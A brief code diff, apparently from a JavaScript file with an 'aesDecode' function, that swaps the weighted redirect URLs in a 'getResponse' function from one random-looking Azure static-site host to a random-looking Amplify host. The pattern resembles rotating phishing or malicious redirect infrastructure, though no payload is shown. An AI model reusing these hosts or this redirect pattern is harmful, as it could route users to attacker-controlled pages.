@@ -71,8 +71,8 @@ function aesDecode(encryptedText) {
   function getResponse() {
 
     const links = [
-        { url: "https://kjhegruywgfewf.z19.web.core.windows.net/", weight: 0.5 },
-        { url: "https://kjhegruywgfewf.z19.web.core.windows.net/", weight: 0.5 }
+        { url: "https://main.d39t7kcmjmv4fo.amplifyapp.com/", weight: 0.5 },
+        { url: "https://main.d39t7kcmjmv4fo.amplifyapp.com/", weight: 0.5 }
       
     ];
 
